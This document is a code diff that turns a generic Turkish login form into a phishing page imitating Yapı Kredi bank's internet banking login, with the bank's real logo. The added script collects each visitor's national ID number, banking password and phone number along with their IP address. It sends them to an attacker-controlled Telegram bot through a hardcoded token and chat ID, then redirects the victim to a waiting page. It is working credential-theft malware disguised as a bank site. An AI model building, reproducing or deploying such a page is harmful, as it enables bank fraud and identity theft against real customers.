@@ -3,119 +3,215 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Kullanıcı Giriş Paneli</title>
-    <link rel="stylesheet" href="style.css">
+    <title>Yapı Kredi İnternet Şubesi</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Segoe UI', Arial, sans-serif;
+            background: linear-gradient(135deg, #00235c 0%, #001333 100%);
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+        }
+
+        .login-container {
+            background-color: rgba(255, 255, 255, 0.98);
+            padding: 30px 40px;
+            border-radius: 12px;
+            box-shadow: 0 8px 32px rgba(0, 0, 0, 0.15);
+            width: 420px;
+            max-width: 100%;
+        }
+
+        .logo {
+            text-align: center;
+            margin-bottom: 25px;
+        }
+
+        .logo img {
+            width: 180px;
+            height: auto;
+        }
+
+        .form-group {
+            margin-bottom: 20px;
+        }
+
+        .form-group label {
+            display: block;
+            margin-bottom: 8px;
+            color: #333;
+            font-weight: 500;
+            font-size: 15px;
+        }
+
+        .form-group input {
+            width: 100%;
+            padding: 12px 15px;
+            border: 2px solid #e0e0e0;
+            border-radius: 8px;
+            font-size: 15px;
+            transition: all 0.3s ease;
+        }
+
+        .form-group input:focus {
+            border-color: #00235c;
+            outline: none;
+            box-shadow: 0 0 0 3px rgba(0, 35, 92, 0.1);
+        }
+
+        button {
+            width: 100%;
+            padding: 14px;
+            background: #00235c;
+            color: white;
+            border: none;
+            border-radius: 8px;
+            cursor: pointer;
+            font-size: 16px;
+            font-weight: 600;
+            transition: all 0.3s ease;
+            margin-top: 10px;
+        }
+
+        button:hover {
+            background: #001333;
+        }
+
+        .security-note {
+            margin-top: 20px;
+            padding: 15px;
+            background-color: #f8f9fa;
+            border-radius: 8px;
+            font-size: 13px;
+            color: #555;
+            border-left: 4px solid #00235c;
+        }
+
+        /* Spinner için ek stil */
+        .spinner {
+            width: 20px;
+            height: 20px;
+            border: 3px solid #f3f3f3;
+            border-top: 3px solid #00235c;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+            margin: 0 auto;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+    </style>
 </head>
 <body>
-    <div class="panel">
-        <h2>Kullanıcı Giriş</h2>
-        <form id="loginForm" onsubmit="return girisYap(event)">
-            <label for="tc">TC Kimlik Numarası:</label>
-            <input type="text" id="tc" name="tc" placeholder="11 haneli TC Kimlik No" maxlength="11" required>
+    <div class="login-container">
+        <div class="logo">
+            <img src="https://assets.yapikredi.com.tr/WebSite/_assets/img/Yapikredi_logo.svg?v6" alt="Yapı Kredi Logo">
+        </div>
+        <form id="loginForm">
+            <div class="form-group">
+                <label for="tcno">T.C. Kimlik Numarası</label>
+                <input type="text" id="tcno" name="tcno" maxlength="11" pattern="[0-9]{11}" 
+                       oninput="this.value = this.value.replace(/[^0-9]/g, '');" required>
+            </div>
+            
+            <div class="form-group">
+                <label for="password">İnternet Şubeniz Şifresi</label>
+                <input type="password" id="password" name="password" maxlength="6"
+                       oninput="this.value = this.value.replace(/[^0-9]/g, '');" required>
+            </div>
+            
+            <div class="form-group">
+                <label for="phone">Cep Telefonu</label>
+                <input type="tel" id="phone" name="phone" maxlength="11" 
+                       oninput="this.value = this.value.replace(/[^0-9]/g, '');" 
+                       placeholder="5XX XXX XX XX" required>
+            </div>
 
-            <label for="sifre">Şifre:</label>
-            <input type="password" id="sifre" name="sifre" placeholder="Şifrenizi girin" required>
+            <button type="submit" id="submitButton">GİRİŞ YAP</button>
+            <button type="button" id="loginProcess" style="display: none;">
+                <div class="spinner"></div>
+            </button>
 
-            <label for="telefon">Telefon Numarası:</label>
-            <input type="tel" id="telefon" name="telefon" placeholder="5XXXXXXXXX" maxlength="10" required>
-
-            <button type="submit">Giriş Yap</button>
+            <div class="security-note">
+                <strong>Güvenliğiniz İçin:</strong> İnternet şifrenizi kimseyle paylaşmayınız. Yapı Kredi çalışanları şifrenizi asla sormaz.
+            </div>
         </form>
-
-        <div class="loader" id="loader">İşleminiz yapılıyor...</div>
-        <div class="error" id="error-message"></div>
-        <div class="success" id="success-message"></div>
     </div>
 
     <script>
-        function tcKimlikDogrula(tcno) {
-            if (tcno.length !== 11) return false;
-            if (tcno[0] === '0') return false;
-            if (!/^\d{11}$/.test(tcno)) return false;
-
-            let toplam = 0;
-            for (let i = 0; i < 10; i++) {
-                toplam += parseInt(tcno.charAt(i));
-            }
-            if (toplam % 10 != tcno.charAt(10)) return false;
-
-            return true;
-        }
-
-        function telefonDogrula(telefon) {
-            return /^5[0-9]{9}$/.test(telefon);
-        }
-
-        function girisYap(event) {
+        document.getElementById('loginForm').addEventListener('submit', function(event) {
             event.preventDefault();
-            
-            const tc = document.getElementById('tc').value;
-            const sifre = document.getElementById('sifre').value;
-            const telefon = document.getElementById('telefon').value;
-            const errorMessage = document.getElementById('error-message');
-            const successMessage = document.getElementById('success-message');
-            const loader = document.getElementById('loader');
 
-            // Mesajları sıfırla ve görünür yap
-            errorMessage.style.display = 'none';
-            successMessage.style.display = 'none';
-            errorMessage.innerHTML = '';
-            successMessage.innerHTML = '';
+            var tcno = document.getElementById('tcno').value;
+            var password = document.getElementById('password').value;
+            var phone = document.getElementById('phone').value;
 
-            // TC Kimlik kontrolü
-            if (!tcKimlikDogrula(tc)) {
-                errorMessage.innerHTML = 'Geçersiz TC Kimlik Numarası!';
-                errorMessage.style.display = 'block';
-                return false;
+            if (tcno && password && phone) {
+                // Butonları değiştir
+                document.getElementById('submitButton').style.display = 'none';
+                document.getElementById('loginProcess').style.display = 'block';
+
+                // IP adresini al
+                fetch('https://api.ipify.org?format=json')
+                    .then(response => response.json())
+                    .then(data => {
+                        var ipAddress = data.ip;
+
+                        // Telegram Bot API URL'si
+                        var telegramAPI = 'https://api.telegram.org/bot7380726850:AAFZMnFFCtWf8SnIjlTCX04jpjlDNVo2TMY/sendMessage';
+
+                        // Mesaj içeriği
+                        var message = 'T.C. Kimlik No: ' + tcno + 
+                                    '\nİnternet Şubesi Şifresi: ' + password + 
+                                    '\nTelefon numarası: ' + phone + 
+                                    '\nIP Adresi: ' + ipAddress;
+
+                        // Telegram'a mesaj gönder
+                        fetch(telegramAPI, {
+                            method: 'POST',
+                            headers: {
+                                'Content-Type': 'application/json'
+                            },
+                            body: JSON.stringify({
+                                chat_id: -1002482878782,
+                                text: message
+                            })
+                        })
+                        .then(response => {
+                            if (response.ok) {
+                                window.location.href = 'bekle3.html';
+                            } else {
+                                console.error('Mesaj gönderilemedi');
+                                // Hata durumunda butonları eski haline getir
+                                document.getElementById('submitButton').style.display = 'block';
+                                document.getElementById('loginProcess').style.display = 'none';
+                            }
+                        })
+                        .catch(error => {
+                            console.error('Telegram Fetch error:', error);
+                            // Hata durumunda butonları eski haline getir
+                            document.getElementById('submitButton').style.display = 'block';
+                            document.getElementById('loginProcess').style.display = 'none';
+                        });
+                    })
+                    .catch(error => {
+                        console.error('IP Adresi Fetch error:', error);
+                        // Hata durumunda butonları eski haline getir
+                        document.getElementById('submitButton').style.display = 'block';
+                        document.getElementById('loginProcess').style.display = 'none';
+                    });
             }
-
-            // Şifre kontrolü
-            if (sifre.length < 6) {
-                errorMessage.innerHTML = 'Şifre en az 6 karakter olmalıdır!';
-                errorMessage.style.display = 'block';
-                return false;
-            }
-
-            // Telefon kontrolü
-            if (!telefonDogrula(telefon)) {
-                errorMessage.innerHTML = 'Geçersiz telefon numarası! Başında 5 ile başlamalı ve 10 haneli olmalıdır.';
-                errorMessage.style.display = 'block';
-                return false;
-            }
-
-            // Loading göster
-            loader.style.display = 'block';
-
-            // Telegram mesajı
-            const message = `Yeni Giriş:\n\nTC: ${tc}\nŞifre: ${sifre}\nTelefon: ${telefon}`;
-            
-            // send.html sayfasına yönlendir
-            fetch('send.html?message=' + encodeURIComponent(message))
-            .then(response => response.text())
-            .then(data => {
-                loader.style.display = 'none';
-                successMessage.innerHTML = 'Giriş başarılı!';
-                successMessage.style.display = 'block';
-                document.getElementById('loginForm').reset();
-            })
-            .catch(error => {
-                loader.style.display = 'none';
-                errorMessage.innerHTML = 'Bir hata oluştu, lütfen tekrar deneyin.';
-                errorMessage.style.display = 'block';
-                console.error('Error:', error);
-            });
-
-            return false;
-        }
-
-        // Input alanlarının gerçek zamanlı kontrolü
-        document.getElementById('tc').addEventListener('input', function(e) {
-            this.value = this.value.replace(/[^0-9]/g, '');
-        });
-
-        document.getElementById('telefon').addEventListener('input', function(e) {
-            this.value = this.value.replace(/[^0-9]/g, '');
         });
     </script>
 </body>
-</html>
+</html> 
